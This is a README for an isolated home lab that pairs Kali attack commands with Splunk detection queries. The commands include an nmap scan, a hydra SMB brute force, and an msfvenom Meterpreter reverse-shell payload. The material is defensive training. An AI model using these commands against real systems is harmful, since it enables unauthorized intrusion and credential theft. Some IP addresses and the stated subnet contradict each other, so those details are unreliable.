# 🏠 Cybersecurity Home Lab — Setup & Monitoring
 
> A fully isolated virtual lab environment for hands-on attack simulation, log collection, and threat detection using Splunk.
 
![Lab Status](https://img.shields.io/badge/Status-Active-brightgreen?style=flat-square)
![Platform](https://img.shields.io/badge/Platform-VirtualBox_7.x-183A61?style=flat-square&logo=virtualbox)
![Attacker](https://img.shields.io/badge/Attacker-Kali_Linux-557C94?style=flat-square&logo=kalilinux)
![Victim](https://img.shields.io/badge/Victim-Windows_11_Enterprise-0078D4?style=flat-square&logo=windows)
![SIEM](https://img.shields.io/badge/SIEM-Splunk-FF5733?style=flat-square&logo=splunk)
![License](https://img.shields.io/badge/License-MIT-yellow?style=flat-square)
 
---
 
## 📋 Table of Contents
 
- [Overview](#-overview)
- [Architecture](#-architecture)
- [Virtualization Platform](#-virtualization-platform)
- [Virtual Machines](#-virtual-machines)
- [Network Configuration](#-network-configuration)
- [Log Monitoring with Splunk](#-log-monitoring-with-splunk)
- [Detection Scenarios](#-detection-scenarios)
- [Lab Workflow](#-lab-workflow)
- [Folder Structure](#-folder-structure)
- [Disclaimer](#-disclaimer)
---
 
## 🧭 Overview
 
This home lab is a **self-contained cybersecurity research environment** built on Oracle VirtualBox. It simulates real-world attacker vs. defender scenarios using industry-standard tooling.
 
The lab is structured around two core disciplines:
 
| Discipline | Description |
|---|---|
| 🔴 **Red Team** | Attack simulation using Kali Linux (Nmap, Metasploit, etc.) |
| 🔵 **Blue Team** | Log collection, monitoring, and threat detection via Splunk |
 
**Primary Focus:** Generating realistic attacker telemetry on Windows 11, forwarding logs to Splunk, and writing detection queries (SPL) to catch malicious behavior.
 
---
 
## 🏗️ Architecture
 
```
┌─────────────────────────────────────────────────────────┐
│                   VirtualBox Host (Windows 10/11)       │
│                                                         │
│   ┌─────────────────┐        ┌──────────────────────┐   │
│   │   Kali Linux    │        │ Windows 11 Enterprise│   │
│   │   (Attacker)    │◄──────►│     (Victim/Target)  │   │
│   │  192.168.20.11  │        │  192.168.20.10       │   │
│   │                 │        │ + Splunk UF installes│   │
│   └─────────────────┘        └──────────┬───────────┘   │
│                                         │               │
│                              ┌──────────▼───────────┐   │
│                              │    Splunk (SIEM)     │   │
│                              │  Log Ingestion &     │   │
│                              │  Threat Detection    │   │
│                              └──────────────────────┘   │
│                                                         │
│            [ Internal Network: labnet ]                 │
│         No traffic leaks to external network            │
└─────────────────────────────────────────────────────────┘
```
 
---
 
## 💻 Virtualization Platform
 
### Oracle VirtualBox
 
| Detail | Info |
|---|---|
| Software | Oracle VirtualBox |
| Version | 7.x (Latest Stable) |
| Host OS | Windows 10 / 11 |
| License | Free & Open Source |
 
📥 [Download VirtualBox](https://www.virtualbox.org/wiki/Downloads)
 
> **Tip:** During installation, allow VirtualBox to install all network adapter drivers when prompted — these are required for internal VM networking.
 
---
 
## 🖥️ Virtual Machines
 
### 1. 🐉 Kali Linux — Attacker Machine
 
Kali Linux is a Debian-based penetration testing distribution maintained by Offensive Security, pre-loaded with 600+ security tools.
 
| Detail | Info |
|---|---|
| Role | Attacker / Red Team |
| OS | Kali Linux 2024.x (64-bit) |
| IP Address | `192.168.20.11` |
| Snapshot | `Clean Snapshot Linux` |
| RAM | 2–4 GB |
| Storage | 20–50 GB |
 
**Key Tools Used:**
- `nmap` — Network scanning & port discovery
- `metasploit` — Exploit framework
- `hydra` — Brute force attacks
- `wireshark` — Packet capture & traffic analysis
- `netcat` — Reverse shell and listener setup
📥 [Download Kali Linux ISO](https://www.kali.org/get-kali/#kali-installer-images)
 
> **Tip:** Download the **Installer** image (not Live) for a persistent installation. Always use the 64-bit version.
 
---
 
### 2. 🪟 Windows 11 Enterprise — Victim Machine
 
Windows 11 Enterprise serves as the attack target, configured to mirror a real corporate endpoint — including logging enabled for Splunk ingestion.
 
| Detail | Info |
|---|---|
| Role | Victim / Blue Team Sensor |
| OS | Windows 11 Enterprise (64-bit) |
| IP Address | `192.168.20.10` |
| Snapshot | `Clean Snapshot` |
| RAM | 4 GB |
| Storage | 50–80 GB |
| Log Agent | Splunk Universal Forwarder |
 
**Windows Logging Configured:**
- Windows Event Logs (Security, System, Application)
- PowerShell Script Block Logging (`HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell`)
- Sysmon (System Monitor) for enhanced process/network telemetry
📥 [Download Windows 11 Enterprise Eval (90-day, free)](https://www.microsoft.com/en-us/evalcenter/evaluate-windows-11-enterprise)
 
> **Tip:** No product key is needed during installation of the Evaluation version — perfect for lab use.
 
---
 
## 🌐 Network Configuration
 
Both VMs communicate over a **VirtualBox Internal Network**, completely isolated from the host's real network.
 
| Setting | Value |
|---|---|
| Network Mode | Internal Network |
| Network Name | `labnet` |
| Subnet | `192.168.0.0/24` |
| Kali IP | `192.168.20.11` |
| Windows IP | `192.168.20.10` |
| Internet Access | ❌ Disabled (fully isolated) |
 
### Setup Steps
 
```
1. Select VM → Settings → Network
2. Adapter 1 → Attached to: Internal Network
3. Name: labnet
4. Repeat for both VMs
5. Assign static IPs manually inside each VM OS
```
 
**Assigning static IP on Kali Linux:**
```bash
sudo ip addr add 192.168.20.11/24 dev eth0
sudo ip link set eth0 up
```
 
**Assigning static IP on Windows 11:**
```
Control Panel → Network Adapter Settings
→ IPv4 → Manual
→ IP: 192.168.20.10 | Mask: 255.255.255.0
```
 
> **Why Internal Network?** Unlike NAT or Bridged modes, Internal Network ensures zero traffic leakage — attacks stay entirely within the virtual environment.
 
---
 
## 📊 Log Monitoring with Splunk
 
### Setup Overview
 
Splunk is used as the SIEM to collect, index, and query logs generated on the Windows 11 victim machine. The **Splunk Universal Forwarder** is installed on Windows and ships logs to a Splunk indexer (running locally or on a separate VM).
 
### Splunk Universal Forwarder — Windows Setup
 
```powershell
# 1. Download and install Splunk UF on Windows 11
# https://www.splunk.com/en_us/download/universal-forwarder.html
 
# 2. Configure inputs.conf to collect Windows Event Logs
# Path: C:\Program Files\SplunkUniversalForwarder\etc\system\local\inputs.conf
 
[WinEventLog://Security]
disabled = 0
index = wineventlog
 
[WinEventLog://System]
disabled = 0
index = wineventlog
 
[WinEventLog://Application]
disabled = 0
index = wineventlog
 
[monitor://C:\Windows\System32\winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx]
disabled = 0
index = powershell_logs
```
 
### Sysmon Installation (Recommended)
 
Sysmon dramatically improves log quality by capturing process creation, network connections, and file changes.
 
```powershell
# Download Sysmon from Sysinternals
# https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon
 
# Install with SwiftOnSecurity's config (highly recommended)
sysmon64.exe -accepteula -i sysmonconfig.xml
```
 
---
 
## 🔍 Detection Scenarios
 
### Scenario 1 — Port Scan Detection (Nmap)
 
**Attack Simulation (Kali):**
```bash
nmap -sS -p 1-65535 192.168.20.10
```
 
**Splunk Detection Query (SPL):**
```spl
index=wineventlog EventCode=5156 OR EventCode=5157
| stats count by src_ip, dest_port, _time
| where count > 50
| sort - count
| table _time, src_ip, dest_port, count
| rename src_ip as "Source IP", dest_port as "Port Scanned", count as "Connection Attempts"
```
 
---
 
### Scenario 2 — Failed Login / Brute Force Detection
 
**Attack Simulation (Kali):**
```bash
hydra -l administrator -P /usr/share/wordlists/rockyou.txt smb://10.0.0.10
```
 
**Splunk Detection Query (SPL):**
```spl
index=wineventlog EventCode=4625
| stats count by src_ip, user, host
| where count > 5
| sort - count
| table src_ip, user, host, count
| rename src_ip as "Attacker IP", user as "Target Account", count as "Failed Attempts"
```
 
---
 
### Scenario 3 — Suspicious PowerShell Execution
 
**Attack Simulation (Kali):**
```bash
# Triggering encoded PowerShell via Metasploit payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe > payload.exe
```
 
**Splunk Detection Query (SPL):**
```spl
index=powershell_logs EventCode=4104
| search ScriptBlockText="*-EncodedCommand*" OR ScriptBlockText="*IEX*" OR ScriptBlockText="*Invoke-Expression*"
| table _time, host, UserID, ScriptBlockText
| rename host as "Victim Host", UserID as "User", ScriptBlockText as "Suspicious Command"
```
 
---
 
### Scenario 4 — New User Account Created (Persistence)
 
**Splunk Detection Query (SPL):**
```spl
index=wineventlog EventCode=4720
| table _time, host, user, Message
| rename host as "Host", user as "Created By", Message as "Event Detail"
```
 
---
 
### Scenario 5 — Reverse Shell / Unusual Outbound Connection
 
**Splunk Detection Query (SPL):**
```spl
index=wineventlog EventCode=3
| where dest_port IN (4444, 1234, 9001, 8080)
| table _time, host, src_ip, dest_ip, dest_port, process_name
| rename process_name as "Process", dest_ip as "C2 IP", dest_port as "C2 Port"
```
 
---
 
## 🔄 Lab Workflow
 
```
1. RESET      →  Revert both VMs to Clean Snapshots
2. START      →  Boot Windows 11 (victim) first, verify Splunk UF is running
3. ATTACK     →  Boot Kali Linux, execute attack scenario
4. MONITOR    →  Open Splunk, run detection SPL queries
5. ANALYSE    →  Review alerts, correlate events, document findings
6. RESET      →  Revert snapshots for next scenario
```
 
> **Snapshot Strategy:** Both VMs are saved in a `Clean Snapshot` state before every session. This enables instant rollback after destructive tests, making every scenario fully repeatable.
 
---
 
## 📁 Folder Structure
 
```
cybersecurity-homelab/
│
├── homelab-setup/
│   ├── readme.md                  ← This file
│   └── virtualbox-homelab-preview.png
│
├── splunk-queries/                ← (Coming Soon)
│   ├── port-scan-detection.spl
│   ├── brute-force-detection.spl
│   ├── powershell-detection.spl
│   └── persistence-detection.spl
│
├── attack-simulations/            
│   ├── reverse_tcp.md         <-  (Go check out)
│   ├── credential_theft.md       <- (Coming Soon)
│   └── brute-force-smb.md
│
├── screenshots/                   ← (Coming Soon)
│   ├── splunk-dashboard.png
│   └── attack-detected.png
│
├── LICENSE
└── README.md
```
 
---
 
## ⚠️ Disclaimer
 
This lab is built **strictly for educational and research purposes**. All attack simulations are performed in a fully isolated, self-contained virtual environment with no connection to external networks.
 
**No techniques or tools documented in this repository are used against any unauthorized system.** Always obtain explicit written permission before conducting security testing on any network, device, or system you do not own.
 
---
 
*Built with curiosity. Defended with logic.*
